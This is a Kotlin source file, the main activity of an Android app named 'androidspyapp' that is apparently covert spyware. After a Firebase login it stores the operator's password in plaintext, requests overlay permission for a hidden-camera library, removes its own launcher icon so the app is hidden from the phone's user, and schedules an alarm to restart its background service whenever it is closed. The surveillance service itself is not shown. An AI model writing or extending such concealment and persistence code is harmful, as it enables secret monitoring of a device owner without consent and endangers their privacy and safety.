package com.komnacki.androidspyapp

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.*
import android.content.pm.PackageManager
import android.os.Bundle
import android.os.SystemClock
import android.text.Editable
import android.text.TextWatcher
import android.view.View
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.androidhiddencamera.HiddenCameraUtils
import com.google.firebase.auth.FirebaseAuth
import kotlinx.android.synthetic.main.activity_main.*


class MainActivity : AppCompatActivity() {
    private val VALIDATE_EMAIL_REGEX_PATERN = "[a-zA-Z0-9._-]+@[a-z]+.[a-z]+"

    companion object {
        const val PREFS_SERVICE_NEXT_ALARM: String = "SHARED_PREFERENCE_LAST_ALARM_TIME"
        const val SHARED_PREFERENCE_TAG: String = "SHARED_PREFERENCE_NAME"
        const val PREFS_IS_FIRST_LAUNCH: String = "IS_FIRST_LAUNCH"
        const val PREFS_USER_EMAIL: String = "PREFS_USER_EMAIL"
        const val PREFS_USER_PASSWORD: String = "PREFS_USER_PASSWORD"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        setTheme(R.style.Theme_AppCompat)
        setContentView(R.layout.activity_main)

        val auth: FirebaseAuth = FirebaseAuth.getInstance()

        val prefs = getSharedPreferences(SHARED_PREFERENCE_TAG, Context.MODE_PRIVATE)
        val isFirstRun = prefs.getBoolean(PREFS_IS_FIRST_LAUNCH, true)

        if (isFirstRun) {
            var isEmailValid = false
            var isPasswordValid = false
            val editor = prefs.edit()

            editor.putBoolean(PREFS_IS_FIRST_LAUNCH, false)
            editor.apply()

            if (!HiddenCameraUtils.canOverDrawOtherApps(this)) {
                HiddenCameraUtils.openDrawOverPermissionSetting(this);
            }

            et_email.addTextChangedListener(object : TextWatcher {
                override fun afterTextChanged(s: Editable?) {
                    onEmailChange(s)
                }

                override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) { /* no action */ }

                override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) { /* no action */ }

                private fun onEmailChange(s: Editable?) {
                    isEmailValid = validateEmail(s.toString())
                    btn_connect.isEnabled = isEmailValid && isPasswordValid
                }
            })
            et_password.addTextChangedListener(object : TextWatcher {
                override fun afterTextChanged(s: Editable?) {
                    onPasswordChange(s)
                }

                override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) { /* no action */ }

                override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) { /* no action */ }

                private fun onPasswordChange(s: Editable?) {
                    isPasswordValid = !s.toString().isBlank()
                    btn_connect.isEnabled = isEmailValid && isPasswordValid
                }
            })

            btn_connect.setOnClickListener {
                if (btn_connect.isEnabled) {
                    onConnect(auth, prefs)
                }
            }
        }
    }

    private fun onConnect(auth: FirebaseAuth, prefs: SharedPreferences) {
        val email = et_email.text.toString()
        val password = et_password.text.toString()
        setButtonVisibility(false)
        onAuth(auth, email, password, prefs)
    }

    private fun onAuth(auth: FirebaseAuth, email: String, password: String, prefs: SharedPreferences) {
        auth.signInWithEmailAndPassword(email, password)
            .addOnCompleteListener(this) { task ->
                if (task.isSuccessful) {
                    saveUserCredential(prefs, email, password)
                    hideAppIcon()

                    val dialog = AlertDialog.Builder(this)
                        .setTitle(getString(R.string.dialog_title_attention))
                        .setMessage(getString(R.string.dialog_description))
                        .setPositiveButton(getString(R.string.dialog_accept)) { dialog: DialogInterface?, _: Int ->
                            run {
                                dialog?.dismiss()
                                this.finish()
                            }
                        }
                    setButtonVisibility(true)
                    dialog.show()
                } else {
                    setButtonVisibility(true)
                    toastAutenticationFailed()
                }
            }
    }

    private fun toastAutenticationFailed() {
        Toast.makeText(
            baseContext, getString(R.string.autentication_failed_toast_message),
            Toast.LENGTH_SHORT
        ).show()
    }

    private fun saveUserCredential(prefs: SharedPreferences, email: String, password: String) {
        val editor = prefs.edit()
        editor.putString(PREFS_USER_EMAIL, email.replace(".", "_"))
        editor.putString(PREFS_USER_PASSWORD, password)
        editor.apply()
    }

    private fun hideAppIcon() {
        val p = packageManager
        val componentName = ComponentName(this, MainActivity::class.java)
        p.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    private fun setButtonVisibility(isBtnVisible: Boolean) {
        btn_connect.visibility = if (isBtnVisible) View.VISIBLE else View.GONE
        progressBar.visibility = if (isBtnVisible) View.GONE else View.VISIBLE
    }

    override fun onDestroy() {
        super.onDestroy()
        startService(Intent(this, MainService::class.java))
        val restartService =
            Intent(applicationContext, ServiceReceiver::class.java)
        restartService.action = Intent.ACTION_DEFAULT

        val pendingIntent = PendingIntent.getBroadcast(
            applicationContext,
            MainService.REQUEST_CODE_FOR_ALARM_MANAGER,
            restartService,
            PendingIntent.FLAG_ONE_SHOT
        )
        val alarmManager =
            getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.set(
            AlarmManager.ELAPSED_REALTIME,
            SystemClock.elapsedRealtime() + 60 * 1000, pendingIntent
        )
    }

    fun validateEmail(input: String): Boolean {
        return input.matches(Regex(VALIDATE_EMAIL_REGEX_PATERN))
    }
}